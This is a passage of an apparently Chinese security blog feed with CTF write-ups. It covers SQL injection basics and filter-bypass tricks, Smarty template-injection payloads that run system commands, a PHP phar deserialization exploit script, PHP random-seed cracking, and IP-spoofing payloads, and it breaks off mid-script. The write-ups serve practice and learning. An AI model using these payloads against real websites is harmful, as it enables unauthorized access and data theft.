    <summary type="html">&lt;h2 id=&quot;代码执行介绍&quot;&gt;&lt;a href=&quot;#代码执行介绍&quot; class=&quot;headerlink&quot; title=&quot;代码执行介绍&quot;&gt;&lt;/a&gt;代码执行介绍&lt;/h2&gt;&lt;p&gt;五类相关函数&lt;/p&gt;
&lt;p&gt;1、eval+assert函数&lt;/p&gt;
&lt;p&gt;2、preg_replace/e最新php不支持，php5广泛使用&lt;/p&gt;
&lt;p&gt;3、用户自定义函数&lt;/p&gt;
&lt;p&gt;4、动态函数&lt;/p&gt;
&lt;p&gt;5、其他&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SQL</title>
    <link href="http://example.com/2021/05/20/CTF-SQL/"/>
    <id>http://example.com/2021/05/20/CTF-SQL/</id>
    <published>2021-05-20T05:52:50.000Z</published>
    <updated>2021-07-27T01:44:37.081Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CTF-SQL注入基础"><a href="#CTF-SQL注入基础" class="headerlink" title="CTF-SQL注入基础"></a>CTF-SQL注入基础</h4><h4 id="万能密码："><a href="#万能密码：" class="headerlink" title="万能密码："></a>万能密码：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><span id="more"></span><p><strong>主要是逻辑or，返回true，密码正确。</strong></p><ul><li>burp需要使用+或%20代替空格</li></ul><p><strong>sql注入类型：数字型、字符串类型</strong></p><ul><li>sql语句中的括号不代表实际意义，主要用于优先级处理。</li></ul><p><strong>sql注入可能存在的位置：</strong></p><p>1、URL提交参数，GET型</p><p>2、HTTP请求主体，POST型</p><p>3、请求头(cookie,user-agent,referer)</p><p><strong>sql注入利用</strong></p><p>1、获取数据库信息</p><p>2、获取系统命令执行shell</p><p>3、上传、下载服务器文件(webshell)等</p><p><strong>技法：</strong></p><p><strong>联合注入、布尔盲注、延时注入、报错注入、堆叠注入、宽字节注入、二次注入、无列名注入等等。</strong></p><h4 id="CTF-SQL注入技巧"><a href="#CTF-SQL注入技巧" class="headerlink" title="CTF-SQL注入技巧"></a>CTF-SQL注入技巧</h4><p>url中字符的特殊含义：</p><p>1、&amp;表示get提交参数的分隔符，如果sql注入中将and替换成&amp;&amp;，要对&amp;进行URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;-&gt;%26%26</span><br></pre></td></tr></table></figure><p>2、#表示锚点，点击当前的链接会跳转到当前页面的某个位置，sql注入需要对#进行URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#-&gt;%23</span><br></pre></td></tr></table></figure><p>3、web站点默认访问index开头的页面，可以省略index.php</p><p>4、web站点默认端口使用80端口，可省略。若非80端口，不可省略。</p><p>绕过过滤姿势</p><p><em>1、常用注释符</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--空格</span><br><span class="line">--+</span><br><span class="line">/*注释*/</span><br><span class="line">在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><em>2、大小写绕过</em></p><p><em>3、双写绕过</em></p><p><em>4、内联注释绕过</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 union /*!select*/ 1,2,3;</span><br><span class="line">加了感叹号，select会被执行。</span><br></pre></td></tr></table></figure><p><em>5、单引号过滤</em></p><ul><li>十六进制绕过</li><li>char函数绕过</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(ascii)+char(ascii)+char(ascii)</span><br></pre></td></tr></table></figure><p><em>6、空格过滤</em></p><ul><li>括号绕过</li></ul><p>遵循查什么，从哪里，符合条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(id)from(users)where(id=1)</span><br></pre></td></tr></table></figure><ul><li>注释符绕过空格</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格-&gt;/**/</span><br></pre></td></tr></table></figure><ul><li>反引号绕过</li></ul><p>由于数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时使用反引号指定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from`users`where`id`=1</span><br></pre></td></tr></table></figure><ul><li>其他空白字符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ascii table：</span><br><span class="line"># TAB水平 09 url编码 %09</span><br><span class="line"># 新行  0A %0A</span><br><span class="line"># 新页  0C %0C</span><br><span class="line"># 回车  0D %0D</span><br><span class="line"># TAB垂直 0B        %0B</span><br></pre></td></tr></table></figure><p><em>7、等号过滤</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like或rlike</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">between and</span><br><span class="line">select * from users where id between 1 and 1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp代替=</span><br></pre></td></tr></table></figure><p><em>8、逗号绕过</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(&#x27;users&#x27;,1,1)=</span><br><span class="line">select substr(&#x27;users&#x27; from 1 for 1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users limit 0,1</span><br><span class="line">select * from users limit 1 offset 0;</span><br><span class="line">第一个参数不为0,从1开始</span><br><span class="line">第二个参数为偏移量</span><br></pre></td></tr></table></figure><p><em>9、过滤了运算比较符号</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">greatest(n1,n2,n3..)返回最大值</span><br><span class="line"></span><br><span class="line">greatest(ascii(substr(database(),1,1)),1)=97;</span><br><span class="line"></span><br><span class="line">least(n1,n2,n3..)返回最小值</span><br><span class="line"></span><br><span class="line">strcmp(str1,str2)</span><br><span class="line">所有字符串相等返回0,小于返回-1,大于返回1</span><br></pre></td></tr></table></figure><h4 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h4><p>一般注入点存在注册的时候，对于管理员密码的任意修改</p><p>关键函数varchar()，当sql语句语句超过varchar定于的最大长度，并且没有唯一键约束。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                           x</span><br></pre></td></tr></table></figure><p>SQL语句设置和取消唯一键约束：</p><p>取消唯一键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table admin drop unique username</span><br></pre></td></tr></table></figure><p>设置唯一键</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table admin add unique (username)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;CTF-SQL注入基础&quot;&gt;&lt;a href=&quot;#CTF-SQL注入基础&quot; class=&quot;headerlink&quot; title=&quot;CTF-SQL注入基础&quot;&gt;&lt;/a&gt;CTF-SQL注入基础&lt;/h4&gt;&lt;h4 id=&quot;万能密码：&quot;&gt;&lt;a href=&quot;#万能密码：&quot; class=&quot;headerlink&quot; title=&quot;万能密码：&quot;&gt;&lt;/a&gt;万能密码：&lt;/h4&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&amp;#x27; or &amp;#x27;1&amp;#x27;=&amp;#x27;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>buu3</title>
    <link href="http://example.com/2021/05/07/buu3/"/>
    <id>http://example.com/2021/05/07/buu3/</id>
    <published>2021-05-07T12:58:59.000Z</published>
    <updated>2021-07-27T01:43:18.843Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><p>最后一行提示smarty</p><span id="more"></span><p>即：<a href="https://zhuanlan.zhihu.com/p/91595921">Smarty SSTI</a></p><p><img src="buu3.md/1.png"></p><p>证明存在<em><strong>Smarty SSTI</strong></em>注入，只有一个花括号，构造payload：</p><p><code>&#123;if readfile(&#39;/flag&#39;)&#125;&#123;/if&#125;</code></p><p>补充smarty常用payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&#x27;/flag&#x27;) &#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/ever_peng/article/details/80008638">ARP协议</a></p><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p><strong>open_basedir</strong></p><p><em><strong>在in_set这个函数中，可以设置php的一些配置，其中就包括open_basedir ，用来限制当前程序可以访问的目录，它是可以访问设置目录下的所有下级目录。</strong></em><br><em><strong>如果“open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/其他任何有的目录”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。”.”可代表当前目录，open_basedir也可以同时设置多个目录,在Windows中用分号分隔目录,在任何其它系统中用冒号分隔目录。</strong></em><br><em><strong>如：ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录</strong></em></p><p><strong>chdir() mkdir()</strong></p><p><em><strong>chdir() 现实目录跳跃，所以下载时要加../</strong></em></p><p>首先注册登陆，可以上传文件，抓包发现，下载的文件参数可控，存在任意文件下载。</p><p><img src="buu3.md/2.png">尝试下载index.php文件，返回不存在此文件。通过../进行下一目录访问</p><p><img src="buu3.md/3.png"></p><p>成功下载index.php文件。发现还有login.php,class.php,存在序列化。还存在delete.php,upload.php。</p><p>不需要每个都看，有侧重点。</p><p>看一下大佬总结的<a href="http://t.zoukankan.com/Cl0ud-p-12177071.html">wp</a></p><p>首先题目就有提示有关<a href="https://xz.aliyun.com/t/2715">phar</a></p><p>我们可以把一个序列化的对象，储存在phar格式的文件中，生成后（一定要是生成后），即使我们把格式给改了，也不影响它的作用：用一些文件包含函数，如果我们以phar://协议去访问这个文件，那么就可以把那个对象给反序列化。</p><p><img src="buu3/4.png"></p><p>我们就让$this-&gt;db = new FileList()，让它去调用close，然后调用__call(),然后再调用 __destruct()函数，打印结果</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// add object of any class as meta data</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> File());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> FileList();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$c</span>-&gt;db=<span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">// create new Phar</span></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了在本地生成phar文件，记得在php.ini配置文件里面修改phar.readonly设置为off，再上传读取。</p><h3 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h3><p>f12查看源码，就有flag。</p><h3 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h3><p>访问check.php,有源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！ </span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123; </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">mt_srand(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>; </span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>; </span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123; </span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);        </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$str_show</span> = substr(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p><em><strong>每次产生的字符串都是随机的，让我们自己去猜，是不可能猜到的，这里还要求严格等于，不能使用之前的方法绕过。</strong></em></p><p><em><strong>其实在前面学习c语言的时候就遇到过rand函数产生的是随机数，需要通过time(0)返回值做随机种子。</strong></em></p><p><em><strong>这里我们就需要通过给我们的伪随机数，获取种子，再通过种子获得完整的随机数。需要通过脚本实现。</strong></em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">key = <span class="string">&#x27;C2EHFSxFPp&#x27;</span></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> i == s[j]:</span><br><span class="line">            m += <span class="string">&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;</span>.<span class="built_in">format</span>(j,j,<span class="built_in">len</span>(s)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 38 38 0 61 28 28 0 61 40 40 0 61 43 43 0 61 41 41 0 61 54 54 0 61 23 23 0 61 41 41 0 61 51 51 0 61 15 15 0 61</span></span><br></pre></td></tr></table></figure><p>使用工具：<strong>php_mt_seed4.0</strong></p><p><a href="https://blog.csdn.net/weixin_46250265/article/details/113919405">安装教程及注意事项</a></p><p>输入</p><p><code>./php_mt_seed 38 38 0 61 28 28 0 61 40 40 0 61 43 43 0 61 41 41 0 61 54 54 0 61 23 23 0 61 41 41 0 61 51 51 0 61 15 15 0 61</code></p><p>进行破解，得到数字109706244</p><p><img src="buu3.md/5.png"></p><p>然后再通过函数mt_rand()产生字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">109706244</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=substr(<span class="variable">$str_long1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再次输入完整字符串，得到flag。</p><h3 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h3><p><em><strong>f12源码中就存在需要我们绕过的，符合题目的套娃，层层递进。</strong></em></p><p><em><strong>想到这里跟前面php字符串解析特性有关系，前面有一题是通过在num参数前加空格会被解析成num(自动把空格去掉了)。</strong></em></p><p><a href="https://www.freebuf.com/articles/web/213359.html">php字符串解析特性</a></p><p><em>由<strong>于php字符串解析特性，会把包括空格内的某些字符转化成下划线</strong></em></p><p><em><strong>我们可以通过空格代替_下划线。</strong></em></p><p><em><strong>在绕过第二个通过换行符%0a经url加密后。得到最后payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t=23333%0a</span><br></pre></td></tr></table></figure><p><em><strong>得到flag在文件secrettw.php</strong></em></p><p><em><strong>需要本地才能，我们使用burp，添加xff消息头。</strong></em></p><p><img src="buu3/6.png"></p><p><em><strong>得到一段jsfuck编码，f12到控制台中输入，弹出post提交Merak</strong></em></p><p><img src="buu3/7.png"></p><p><em><strong>我们随便post提交参数Merak一下，源码就出来了。</strong></em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><em><strong>通过存在file_get_contents()读取通过get提交参数2333的内容，通过伪协议data://数据流封装器，以传递相应格式的数据。</strong></em></p><p><em><strong>这里可以不进行base64加密操作，</strong></em></p><p><em><strong>payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain,todat is a happy day</span><br></pre></td></tr></table></figure><p>还有这里xff给ban了，我们使用<strong>Client-IP</strong>进行IP伪造，Client的IP是通过http的头部发送到server端的。</p><p><em><strong>这里对file传入的参数加密了，</strong></em></p><p><strong><em>通过change函数的作用，传入的参数先进行base64解码，然后将字符转化成ASCII并且+$i</em>2</strong>*</p><p><em><strong>char()把ascii转成字符串，ord()把字符串变ascii码</strong></em></p><p><strong><em>我们通过加密脚本，反写一个解密脚本。先把字符串转成ascii码，再-$i</em>2，最后base64编码。</strong>*</p><p><em><strong>很简单，只是一个顺序问题，还有加减问题。</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![8](buu3/8.png)&lt;?phpfunction unchange($v)&#123;     $re = &#x27;&#x27;;     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) - $i*2 );     &#125;     return base64_encode($re); &#125;echo 